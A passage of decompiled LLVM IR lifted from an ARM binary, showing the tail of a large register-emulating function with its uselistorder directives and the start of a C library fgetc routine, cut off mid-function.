dec_label_pc_138d4:                               ; preds = %dec_label_pc_138a4
  %v2_138d4 = icmp eq i32 %v2_138c0, 0
  store i1 %v2_138d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_138d4, label %dec_label_pc_138dc, label %dec_label_pc_138a4

dec_label_pc_138dc:                               ; preds = %dec_label_pc_138d4
  %v1_138dc = add i32 %v5_138bc, -2
  store i32 %v1_138dc, i32* %r3.global-to-local, align 4
  %v0_138e0 = load i32, i32* %sl.global-to-local, align 4
  %v1_138e0 = trunc i32 %v0_138e0 to i8
  %v4_138e0 = inttoptr i32 %v1_138dc to i8*
  store i8 %v1_138e0, i8* %v4_138e0, align 1
  %v0_138e4 = load i32, i32* %r3.global-to-local, align 4
  %v1_138e4 = add i32 %v0_138e4, -1
  store i32 %v1_138e4, i32* %r2.global-to-local, align 4
  %v0_138e8 = load i32, i32* %r4.global-to-local, align 4
  %v1_138e8 = trunc i32 %v0_138e8 to i8
  %v4_138e8 = inttoptr i32 %v1_138e4 to i8*
  store i8 %v1_138e8, i8* %v4_138e8, align 1
  store i32 112, i32* %r3.global-to-local, align 4
  %v0_138f0 = load i32, i32* %r7.global-to-local, align 4
  %v1_138f0 = inttoptr i32 %v0_138f0 to i32*
  store i32 112, i32* %v1_138f0, align 4
  %v3_138f0 = add i32 %v0_138f0, 4
  %v4_138f0 = inttoptr i32 %v3_138f0 to i32*
  %v5_138f0 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v5_138f0, i32* %v4_138f0, align 4
  %v0_138f4 = load i32, i32* %r2.global-to-local, align 4
  %v1_138f4 = load i32, i32* %r7.global-to-local, align 4
  %v2_138f4 = add i32 %v1_138f4, 8
  %v3_138f4 = inttoptr i32 %v2_138f4 to i32*
  store i32 %v0_138f4, i32* %v3_138f4, align 4
  %v0_138f8 = load i32, i32* %r7.global-to-local, align 4
  %v1_138f8 = add i32 %v0_138f8, 12
  store i32 %v1_138f8, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_138fc

dec_label_pc_138fc:                               ; preds = %dec_label_pc_13874, %.thread124, %dec_label_pc_138dc
  %v1_13908.pre = phi i32 [ %v2_133d4, %.thread124 ], [ %v1_138f8, %dec_label_pc_138dc ], [ %v1_13908.pre.pre, %dec_label_pc_13874 ]
  %v2_138fc = ptrtoint i32* %stack_var_-164 to i32
  store i32 %v2_138fc, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13900

dec_label_pc_13900:                               ; preds = %dec_label_pc_13900, %dec_label_pc_138fc
  %v0_13900 = phi i32 [ %v2_138fc, %dec_label_pc_138fc ], [ %v4_13900, %dec_label_pc_13900 ]
  %stack_var_-188.0 = phi i32 [ %v3_13270, %dec_label_pc_138fc ], [ %v2_1390c, %dec_label_pc_13900 ]
  %v1_13900 = inttoptr i32 %v0_13900 to i32*
  %v2_13900 = load i32, i32* %v1_13900, align 4
  store i32 %v2_13900, i32* %r3.global-to-local, align 4
  %v4_13900 = add i32 %v0_13900, 12
  store i32 %v4_13900, i32* %r2.global-to-local, align 4
  %v3_13908 = icmp ult i32 %v4_13900, %v1_13908.pre
  %v2_1390c = sub i32 %stack_var_-188.0, %v2_13900
  store i32 %v2_1390c, i32* %ip.global-to-local, align 4
  br i1 %v3_13908, label %dec_label_pc_13900, label %dec_label_pc_13918

dec_label_pc_13918:                               ; preds = %dec_label_pc_13900
  %v3_13918 = load i8, i8* %stack_var_-46, align 1
  %v4_13918 = sext i8 %v3_13918 to i32
  store i32 %v4_13918, i32* %r3.global-to-local, align 4
  store i32 %v4_13918, i32* %r2.global-to-local, align 4
  %v2_1391c = icmp eq i8 %v3_13918, 0
  store i1 %v2_1391c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1391c, label %bb254, label %bb253

bb253:                                            ; preds = %dec_label_pc_13918
  store i32 1, i32* %r2.global-to-local, align 4
  br label %bb254

bb254:                                            ; preds = %dec_label_pc_13918, %bb253
  %v1_1397c = phi i32 [ %v4_13918, %dec_label_pc_13918 ], [ 1, %bb253 ]
  %v2_13924 = sub i32 %v2_1390c, %v1_1397c
  store i32 %v2_13924, i32* %r1.global-to-local, align 4
  store i32 160, i32* %r0.global-to-local, align 4
  %v2_1392c = ptrtoint i8* %stack_var_-46 to i32
  store i32 %v2_1392c, i32* %r3.global-to-local, align 4
  %v2_13930 = icmp eq i32 %v2_13924, 0
  store i1 %v2_13930, i1* %cpsr_z.global-to-local, align 1
  store i32 160, i32* %stack_var_-180, align 4
  %tmp255 = icmp slt i32 %v2_13924, 1
  br i1 %tmp255, label %dec_label_pc_13998, label %dec_label_pc_13944

dec_label_pc_13944:                               ; preds = %bb254
  %v3_13944 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_13944, i32* %lr.global-to-local, align 4
  %v1_13948 = add i32 %v3_13944, 12
  %v2_13948 = inttoptr i32 %v1_13948 to i32*
  %v3_13948 = load i32, i32* %v2_13948, align 4
  store i32 %v3_13948, i32* %r3.global-to-local, align 4
  %v1_1394c = and i32 %v3_13948, 8
  %v2_1394c = icmp eq i32 %v1_1394c, 0
  store i1 %v2_1394c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1394c, label %dec_label_pc_13970, label %dec_label_pc_13954

dec_label_pc_13954:                               ; preds = %dec_label_pc_13944
  store i32 ptrtoint (i32* @global_var_24010.405 to i32), i32* %r2.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 -34125), i32* %r3.global-to-local, align 4
  %v1_13964 = add i32 %v1_13908.pre, 12
  store i32 %v1_13964, i32* %r6.global-to-local, align 4
  %v1_13968 = inttoptr i32 %v1_13908.pre to i32*
  store i32 160, i32* %v1_13968, align 4
  %v3_13968 = add i32 %v1_13908.pre, 4
  %v4_13968 = inttoptr i32 %v3_13968 to i32*
  %v5_13968 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_13968, i32* %v4_13968, align 4
  %v6_13968 = add i32 %v1_13908.pre, 8
  %v7_13968 = inttoptr i32 %v6_13968 to i32*
  %v8_13968 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v8_13968, i32* %v7_13968, align 4
  br label %dec_label_pc_1399c

dec_label_pc_13970:                               ; preds = %dec_label_pc_13944
  store i32 %v3_13944, i32* %ip.global-to-local, align 4
  %v1_13974 = add i32 %v3_13944, 16
  %v2_13974 = inttoptr i32 %v1_13974 to i32*
  %v3_13974 = load i32, i32* %v2_13974, align 4
  store i32 %v3_13974, i32* %r3.global-to-local, align 4
  %v7_13978 = icmp eq i32 %v3_13974, 48
  store i1 %v7_13978, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_13978, label %.thread54.thread70, label %bb256

bb256:                                            ; preds = %dec_label_pc_13970
  store i32 %v2_1390c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_13998

.thread54.thread70:                               ; preds = %dec_label_pc_13970
  %v4_13984 = load i32, i32* %stack_var_-164, align 4
  store i32 %v1_13908.pre, i32* %r6.global-to-local, align 4
  %v3_1398c = add i32 %v4_13984, %v2_13924
  store i32 %v3_1398c, i32* %r3.global-to-local, align 4
  store i32 %v3_1398c, i32* %stack_var_-164, align 4
  br label %dec_label_pc_1399c

dec_label_pc_13998:                               ; preds = %bb256, %bb254
  store i32 %v1_13908.pre, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1399c

dec_label_pc_1399c:                               ; preds = %.thread54.thread70, %dec_label_pc_13954, %dec_label_pc_13998
  store i32 0, i32* %r7.global-to-local, align 4
  %v2_139a0 = ptrtoint i32* %stack_var_-180 to i32
  store i32 %v2_139a0, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_139a4

dec_label_pc_139a4:                               ; preds = %dec_label_pc_139cc, %dec_label_pc_1399c
  %v0_139a4 = phi i32 [ %v1_139c0, %dec_label_pc_139cc ], [ %v2_139a0, %dec_label_pc_1399c ]
  %v1_139a4 = inttoptr i32 %v0_139a4 to i32*
  %v2_139a4 = load i32, i32* %v1_139a4, align 4
  store i32 %v2_139a4, i32* @r1, align 4
  %v3_139a4 = add i32 %v0_139a4, 4
  %v4_139a4 = inttoptr i32 %v3_139a4 to i32*
  %v5_139a4 = load i32, i32* %v4_139a4, align 4
  store i32 %v5_139a4, i32* %r2.global-to-local, align 4
  %v6_139a4 = add i32 %v0_139a4, 8
  %v7_139a4 = inttoptr i32 %v6_139a4 to i32*
  %v8_139a4 = load i32, i32* %v7_139a4, align 4
  store i32 %v8_139a4, i32* %r3.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  store i32 %arg5, i32* %ip.global-to-local, align 4
  store i32 80312, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %arg5)
  %v0_139b8 = load i32, i32* %r5.global-to-local, align 4
  %v1_139b8 = add i32 %v0_139b8, 4
  %v2_139b8 = inttoptr i32 %v1_139b8 to i32*
  %v3_139b8 = load i32, i32* %v2_139b8, align 4
  store i32 %v3_139b8, i32* %r3.global-to-local, align 4
  %v0_139bc = load i32, i32* %r0.global-to-local, align 4
  %v9_139bc = icmp eq i32 %v0_139bc, %v3_139b8
  store i1 %v9_139bc, i1* %cpsr_z.global-to-local, align 1
  %v1_139c0 = add i32 %v0_139b8, 12
  store i32 %v1_139c0, i32* %r5.global-to-local, align 4
  br i1 %v9_139bc, label %dec_label_pc_139cc, label %bb257

bb257:                                            ; preds = %dec_label_pc_139a4
  store i32 -1, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_139ec

dec_label_pc_139cc:                               ; preds = %dec_label_pc_139a4
  %v0_139d0.pre = load i32, i32* %r7.global-to-local, align 4
  %v1_139cc = load i32, i32* %r6.global-to-local, align 4
  %v3_139cc = icmp ult i32 %v1_139c0, %v1_139cc
  %v9_139cc = icmp eq i32 %v1_139c0, %v1_139cc
  store i1 %v9_139cc, i1* %cpsr_z.global-to-local, align 1
  %v2_139d0 = add i32 %v0_139d0.pre, %v3_139b8
  store i32 %v2_139d0, i32* %r7.global-to-local, align 4
  br i1 %v3_139cc, label %dec_label_pc_139a4, label %dec_label_pc_139ec

dec_label_pc_139e4:                               ; preds = %.thread21, %bb239
  %v0_139e4 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_139e4, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_136e4

dec_label_pc_139ec:                               ; preds = %dec_label_pc_139cc, %bb257
  %v0_139ec = phi i32 [ -1, %bb257 ], [ %v2_139d0, %dec_label_pc_139cc ]
  store i32 %v0_139ec, i32* %r0.global-to-local, align 4
  store i32 %v27_13228, i32* @lr, align 4
  ret i32 %v0_139ec

; uselistorder directives
  uselistorder i32 %v0_139ec, { 1, 0 }
  uselistorder i32 %v1_139cc, { 1, 0 }
  uselistorder i32 %v1_139c0, { 0, 1, 3, 2 }
  uselistorder i32 %v0_139a4, { 2, 1, 0 }
  uselistorder i32 %v3_13944, { 1, 0, 2, 3 }
  uselistorder i32 %v2_1390c, { 0, 1, 3, 2 }
  uselistorder i32 %v4_13900, { 1, 2, 0 }
  uselistorder i32 %v0_13900, { 1, 0 }
  uselistorder i32 %v1_13908.pre, { 6, 5, 3, 2, 1, 4, 0 }
  uselistorder i32 %v2_138c0, { 2, 3, 4, 1, 0 }
  uselistorder i32 %v6_138bc, { 2, 1, 0 }
  uselistorder i32 %storemerge158, { 1, 0 }
  uselistorder i32 %v0_13880, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v2_13848, { 1, 0 }
  uselistorder i32 %v1_13848, { 1, 2, 0, 3 }
  uselistorder i32 %v2_13844, { 2, 4, 0, 1, 3, 5 }
  uselistorder i1 %v2_137a4, { 2, 1, 0 }
  uselistorder i32 %v2_13724, { 1, 3, 2, 4, 0 }
  uselistorder i32 %v2_13714, { 1, 2, 3, 5, 0, 4, 6 }
  uselistorder i1 %v2_13700, { 1, 0, 2 }
  uselistorder i32 %v5_136fc, { 0, 2, 1, 3 }
  uselistorder i32 %v1_1378c30, { 3, 0, 4, 6, 1, 2, 5, 7, 8, 9 }
  uselistorder i1 %v2_136b4, { 1, 0 }
  uselistorder i32 %v1_136ac, { 1, 2, 0 }
  uselistorder i32 %v2_136a0, { 1, 0 }
  uselistorder i32 %v1_136a0, { 1, 2, 0, 3 }
  uselistorder i32 %v0_136a0, { 3, 4, 0, 5, 6, 1, 2, 7 }
  uselistorder i1 %v3_13670, { 1, 0 }
  uselistorder i32 %v0_13670, { 0, 2, 1 }
  uselistorder i32 %v2_1366c, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32 %v1_13658, { 1, 0 }
  uselistorder i1 %v2_13648, { 1, 0 }
  uselistorder i32 %v1_13644, { 3, 2, 1, 0 }
  uselistorder i32 %v2_13640, { 1, 0 }
  uselistorder i1 %v2_13630, { 1, 0 }
  uselistorder i32 %v1_13624, { 0, 2, 1, 4, 3 }
  uselistorder i32 %v2_135d8, { 1, 2, 0, 3 }
  uselistorder i32 %v0_135d8, { 1, 0, 2 }
  uselistorder i1 %v2_135c0, { 1, 0 }
  uselistorder i32 %v5_135a8, { 1, 0 }
  uselistorder i32 %v0_13594, { 1, 2, 0, 3 }
  uselistorder i32 %v0_1357c, { 1, 2, 0 }
  uselistorder i32 %v2_13578, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_13510, { 2, 4, 1, 0, 3 }
  uselistorder i32 %stack_var_-192.4, { 1, 2, 0, 3 }
  uselistorder i32 %v0_134b8, { 1, 0 }
  uselistorder double %v2_1347c, { 1, 0 }
  uselistorder i32 %v0_13438, { 1, 2, 0, 4, 3, 5 }
  uselistorder i32 %v3_1342c, { 1, 0 }
  uselistorder i32 %v2_13468, { 1, 3, 0, 2 }
  uselistorder i32 %v0_133fc, { 1, 0 }
  uselistorder i32 %v5_133b8, { 1, 0 }
  uselistorder i32 %v1_132d8.v0_132c45, { 1, 0 }
  uselistorder i32 %v3_13394, { 1, 0 }
  uselistorder i32 %v0_13370, { 0, 2, 3, 1 }
  uselistorder i32 %v2_13358, { 2, 1, 0 }
  uselistorder i32 %v0_1333c, { 1, 0 }
  uselistorder i32 %v0_1325c, { 0, 2, 3, 1, 4, 5 }
  uselistorder i32* %stack_var_-156, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_-83, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-82, { 1, 2, 0 }
  uselistorder i32* %stack_var_-180, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_-144, { 1, 0, 2 }
  uselistorder i32* %stack_var_-47, { 1, 0 }
  uselistorder i32* %stack_var_-164, { 0, 1, 4, 2, 3 }
  uselistorder i8* %stack_var_-46, { 0, 5, 4, 3, 2, 1 }
  uselistorder i32* %stack_var_0, { 2, 3, 0, 1 }
  uselistorder i32 %tmp160, { 1, 0, 2, 3 }
  uselistorder i32* %sb.global-to-local, { 2, 3, 4, 5, 6, 0, 7, 8, 1, 9 }
  uselistorder i32* %r8.global-to-local, { 0, 1, 2, 3, 4, 6, 5, 7, 8, 9, 10, 12, 11, 13 }
  uselistorder i32* %r7.global-to-local, { 0, 2, 1, 3, 4, 13, 14, 15, 5, 16, 17, 6, 18, 19, 20, 7, 21, 22, 8, 23, 24, 9, 10, 11, 12, 25, 26, 27, 28, 30, 29, 31, 32 }
  uselistorder i32* %r6.global-to-local, { 21, 0, 22, 1, 2, 3, 4, 19, 20, 5, 6, 9, 10, 11, 7, 12, 13, 8, 15, 14, 16, 17, 18 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 9, 7, 10, 11, 8, 12, 13, 14, 15, 16, 17 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 20, 18, 19, 21, 22, 23, 24, 25, 26, 27, 29, 43, 30, 34, 31, 32, 33, 35, 28, 36, 37, 38, 39, 40, 41, 42, 64, 45, 44, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 2, 65, 66, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 18, 15, 19, 20, 16, 17, 21, 22, 23, 26, 24, 25, 27, 28, 29, 30, 32, 31, 33, 34, 35, 36, 37, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 13, 10, 11, 14, 16, 12, 17, 15, 18, 19, 0, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35 }
  uselistorder i32* %r0.global-to-local, { 4, 5, 6, 7, 1, 8, 9, 15, 18, 19, 16, 10, 11, 17, 12, 13, 3, 20, 14, 0, 21, 22, 38, 37, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 36, 35, 2 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 6, 7, 8, 3, 4, 5, 9, 12, 10, 11, 13, 14, 15, 16, 17, 18 }
  uselistorder i32* %fp.global-to-local, { 3, 4, 0, 1, 5, 2, 6 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 61, 19, 20, 21, 22, 23, 24, 25, 26, 60, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 0, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59 }
  uselistorder i32 57, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__aeabi_dcmpge, { 1, 0 }
  uselistorder i32 1104006501, { 4, 1, 2, 0, 3 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 -34104), { 0, 2, 1 }
  uselistorder i32 1100470148, { 1, 2, 0, 3 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 -34128), { 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__aeabi_dcmplt, { 3, 2, 1, 0 }
  uselistorder double 0.000000e+00, { 2, 1, 0, 3 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__aeabi_dcmpeq, { 2, 1, 0 }
  uselistorder i8 32, { 0, 1, 2, 3, 4, 7, 6, 8, 5, 11, 10, 9, 12, 13 }
  uselistorder i32 %arg5, { 1, 0 }
  uselistorder i32 %arg4, { 0, 1, 2, 6, 5, 4, 3, 8, 7, 9 }
  uselistorder label %dec_label_pc_139e4, { 1, 0 }
  uselistorder label %dec_label_pc_1399c, { 2, 0, 1 }
  uselistorder label %bb254, { 1, 0 }
  uselistorder label %dec_label_pc_138fc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13874, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13844, { 1, 0 }
  uselistorder label %.thread46, { 1, 0 }
  uselistorder label %dec_label_pc_1381c, { 1, 0 }
  uselistorder label %dec_label_pc_137f0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_137cc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1379c, { 2, 1, 0 }
  uselistorder label %.thread34, { 2, 1, 0 }
  uselistorder label %dec_label_pc_136e4, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_136d4, { 1, 0 }
  uselistorder label %bb236, { 1, 0 }
  uselistorder label %bb234, { 1, 0 }
  uselistorder label %bb232, { 1, 0 }
  uselistorder label %.thread145, { 1, 0 }
  uselistorder label %._crit_edge93, { 1, 0 }
  uselistorder label %bb228, { 1, 0 }
  uselistorder label %bb226, { 1, 0 }
  uselistorder label %.preheader, { 3, 1, 0, 2 }
  uselistorder label %bb223, { 1, 0 }
  uselistorder label %dec_label_pc_135fc, { 2, 1, 0 }
  uselistorder label %bb220, { 2, 1, 0 }
  uselistorder label %dec_label_pc_13508, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_134b8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_134b0, { 1, 0 }
  uselistorder label %bb212, { 1, 0 }
  uselistorder label %.thread124, { 1, 0 }
  uselistorder label %dec_label_pc_13394, { 1, 0 }
  uselistorder label %.thread9, { 1, 0 }
  uselistorder label %dec_label_pc_132b0, { 1, 0 }
  uselistorder label %bb205, { 1, 0 }
  uselistorder label %bb203, { 1, 0 }
  uselistorder label %bb201, { 1, 0 }
}

define i32 @__GI_fgetc(i32 %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_13a1c = load i32, i32* @r4, align 4
  store i32 %v3_13a1c, i32* %stack_var_-20, align 4
  %v6_13a1c = load i32, i32* @r5, align 4
  %v9_13a1c = load i32, i32* @r6, align 4
  %v12_13a1c = load i32, i32* @r7, align 4
  %v15_13a1c = load i32, i32* @lr, align 4
  %v1_13a20 = add i32 %arg1, 52
  %v2_13a20 = inttoptr i32 %v1_13a20 to i32*
  %v3_13a20 = load i32, i32* %v2_13a20, align 4
  store i32 %v3_13a20, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_13a24 = icmp eq i32 %v3_13a20, 0
  store i32 %arg1, i32* @r7, align 4
  br i1 %v2_13a24, label %dec_label_pc_13a58, label %dec_label_pc_13a34

dec_label_pc_13a34:                               ; preds = %entry
  %v1_13a34 = add i32 %arg1, 16
  %v2_13a34 = inttoptr i32 %v1_13a34 to i32*
  %v3_13a34 = load i32, i32* %v2_13a34, align 4
  store i32 %v3_13a34, i32* %r2.global-to-local, align 4
  %v1_13a38 = add i32 %arg1, 24
  %v2_13a38 = inttoptr i32 %v1_13a38 to i32*
  %v3_13a38 = load i32, i32* %v2_13a38, align 4
  store i32 %v3_13a38, i32* %r3.global-to-local, align 4
  %v3_13a3c = icmp uge i32 %v3_13a34, %v3_13a38
  store i1 %v3_13a3c, i1* %cpsr_c.global-to-local, align 1
  br i1 %v3_13a3c, label %dec_label_pc_13a4c, label %.thread

.thread:                                          ; preds = %dec_label_pc_13a34
  %v2_13a40 = inttoptr i32 %v3_13a34 to i8*
  %v3_13a40 = load i8, i8* %v2_13a40, align 1
  %v4_13a40 = zext i8 %v3_13a40 to i32
  store i32 %v4_13a40, i32* %r5.global-to-local, align 4
  %v6_13a40 = add i32 %v3_13a34, 1
  store i32 %v6_13a40, i32* %r2.global-to-local, align 4
  store i32 %v6_13a40, i32* %v2_13a34, align 4
  br label %dec_label_pc_13b50

dec_label_pc_13a4c:                               ; preds = %dec_label_pc_13a34
  %v1_13a4c = inttoptr i32 %arg1 to i16*
  %v2_13a4c = call i32 @getc_unlocked(i16* %v1_13a4c)
  store i32 %v2_13a4c, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_13b50

dec_label_pc_13a58:                               ; preds = %entry
  %v0_13a58 = call i32 @__aeabi_read_tp()
  %v0_13a5c = load i32, i32* @r7, align 4
  %v1_13a5c = add i32 %v0_13a5c, 64
  %v2_13a5c = inttoptr i32 %v1_13a5c to i32*
  %v3_13a5c = load i32, i32* %v2_13a5c, align 4
  store i32 %v3_13a5c, i32* %r3.global-to-local, align 4
  %v1_13a60 = add i32 %v0_13a58, -1168
  store i32 %v1_13a60, i32* @r6, align 4
  %v3_13a64 = icmp uge i32 %v3_13a5c, %v1_13a60
  store i1 %v3_13a64, i1* %cpsr_c.global-to-local, align 1
  %v9_13a64 = icmp eq i32 %v3_13a5c, %v1_13a60
  br i1 %v9_13a64, label %dec_label_pc_13aac, label %dec_label_pc_13a6c

dec_label_pc_13a6c:                               ; preds = %dec_label_pc_13a58
  %v1_13a6c = add i32 %v0_13a5c, 56
  store i32 %v1_13a6c, i32* @r5, align 4
  store i32 %v1_13a6c, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13a78

dec_label_pc_13a78:                               ; preds = %dec_label_pc_13a84.dec_label_pc_13a78_crit_edge, %dec_label_pc_13a6c
  %v0_13a78 = phi i32 [ %v0_13a78.pre, %dec_label_pc_13a84.dec_label_pc_13a78_crit_edge ], [ %v1_13a6c, %dec_label_pc_13a6c ]
  %v1_13a78 = inttoptr i32 %v0_13a78 to i32*
  %v2_13a78 = load i32, i32* %v1_13a78, align 4
  store i32 %v2_13a78, i32* %r3.global-to-local, align 4
  %v1_13a7c = load i32, i32* @r4, align 4
  %v3_13a7c = icmp uge i32 %v2_13a78, %v1_13a7c
  store i1 %v3_13a7c, i1* %cpsr_c.global-to-local, align 1
  %v9_13a7c = icmp eq i32 %v2_13a78, %v1_13a7c
  br i1 %v9_13a7c, label %dec_label_pc_13a84, label %dec_label_pc_13a9c

dec_label_pc_13a84:                               ; preds = %dec_label_pc_13a78
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_13a94 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_13a94, label %dec_label_pc_13a98, label %dec_label_pc_13a84.dec_label_pc_13a78_crit_edge

dec_label_pc_13a84.dec_label_pc_13a78_crit_edge:  ; preds = %dec_label_pc_13a84
  %v0_13a78.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13a78

dec_label_pc_13a98:                               ; preds = %dec_label_pc_13a84
  %v0_13a98 = load i32, i32* @r4, align 4
  store i32 %v0_13a98, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_13a9c

dec_label_pc_13a9c:                               ; preds = %dec_label_pc_13a78, %dec_label_pc_13a98
  %v0_13a9c = phi i32 [ %v0_13a98, %dec_label_pc_13a98 ], [ %v2_13a78, %dec_label_pc_13a78 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_13a9c = icmp eq i32 %v0_13a9c, 0
  br i1 %v2_13a9c, label %bb18, label %bb

bb:                                               ; preds = %dec_label_pc_13a9c
  br label %bb18

bb18:                                             ; preds = %dec_label_pc_13a9c, %bb
  store i32 80552, i32* @lr, align 4
  %v1_13aa4 = xor i1 %v2_13a9c, true
  call void @__pseudo_cond_branch(i1 %v1_13aa4, i32 ptrtoint (i32* @global_var_10884.421 to i32))
  %v0_13aa8 = load i32, i32* @r6, align 4
  %v1_13aa8 = load i32, i32* @r7, align 4
  %v2_13aa8 = add i32 %v1_13aa8, 64
  %v3_13aa8 = inttoptr i32 %v2_13aa8 to i32*
  store i32 %v0_13aa8, i32* %v3_13aa8, align 4
  %v0_13aac.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_13aac

dec_label_pc_13aac:                               ; preds = %dec_label_pc_13a58, %bb18
  %v1_13abc = phi i32 [ %v0_13a5c, %dec_label_pc_13a58 ], [ %v0_13aac.pre, %bb18 ]
  %v1_13aac = add i32 %v1_13abc, 60
  %v2_13aac = inttoptr i32 %v1_13aac to i32*
  %v3_13aac = load i32, i32* %v2_13aac, align 4
  store i32 %v3_13aac, i32* %r2.global-to-local, align 4
  %v1_13ab0 = add i32 %v1_13abc, 16
  %v2_13ab0 = inttoptr i32 %v1_13ab0 to i32*
  %v3_13ab0 = load i32, i32* %v2_13ab0, align 4
  store i32 %v3_13ab0, i32* @r1, align 4
  %v1_13ab4 = add i32 %v1_13abc, 24
  %v2_13ab4 = inttoptr i32 %v1_13ab4 to i32*
  %v3_13ab4 = load i32, i32* %v2_13ab4, align 4
  store i32 %v3_13ab4, i32* %r3.global-to-local, align 4
  %v1_13ab8 = add i32 %v3_13aac, 1
  store i32 %v1_13ab8, i32* %r2.global-to-local, align 4
  store i32 %v1_13ab8, i32* %v2_13aac, align 4
  %v0_13ac0 = load i32, i32* @r1, align 4
  %v1_13ac0 = load i32, i32* %r3.global-to-local, align 4
  %v3_13ac0 = icmp uge i32 %v0_13ac0, %v1_13ac0
  store i1 %v3_13ac0, i1* %cpsr_c.global-to-local, align 1
  br i1 %v3_13ac0, label %dec_label_pc_13ad0, label %.thread2

.thread2:                                         ; preds = %dec_label_pc_13aac
  %v2_13ac4 = inttoptr i32 %v0_13ac0 to i8*
  %v3_13ac4 = load i8, i8* %v2_13ac4, align 1
  %v4_13ac4 = zext i8 %v3_13ac4 to i32
  store i32 %v4_13ac4, i32* %r5.global-to-local, align 4
  %v6_13ac4 = add i32 %v0_13ac0, 1
  store i32 %v6_13ac4, i32* @r1, align 4
  %v2_13ac8 = load i32, i32* @r7, align 4
  %v3_13ac8 = add i32 %v2_13ac8, 16
  %v4_13ac8 = inttoptr i32 %v3_13ac8 to i32*
  store i32 %v6_13ac4, i32* %v4_13ac8, align 4
  br label %dec_label_pc_13adc

dec_label_pc_13ad0:                               ; preds = %dec_label_pc_13aac
  %v0_13ad0 = load i32, i32* @r7, align 4
  %v1_13ad4 = inttoptr i32 %v0_13ad0 to i16*
  %v2_13ad4 = call i32 @getc_unlocked(i16* %v1_13ad4)
  store i32 %v2_13ad4, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_13adc

dec_label_pc_13adc:                               ; preds = %.thread2, %dec_label_pc_13ad0
  %v0_13adc = load i32, i32* @r7, align 4
  %v1_13adc = add i32 %v0_13adc, 60
  %v2_13adc = inttoptr i32 %v1_13adc to i32*
  %v3_13adc = load i32, i32* %v2_13adc, align 4
  %v1_13ae0 = add i32 %v3_13adc, -1
  store i32 %v1_13ae0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_13ae4 = icmp eq i32 %v1_13ae0, 0
  store i32 %v1_13ae0, i32* %v2_13adc, align 4
  br i1 %v2_13ae4, label %dec_label_pc_13af0, label %dec_label_pc_13b50

dec_label_pc_13af0:                               ; preds = %dec_label_pc_13adc
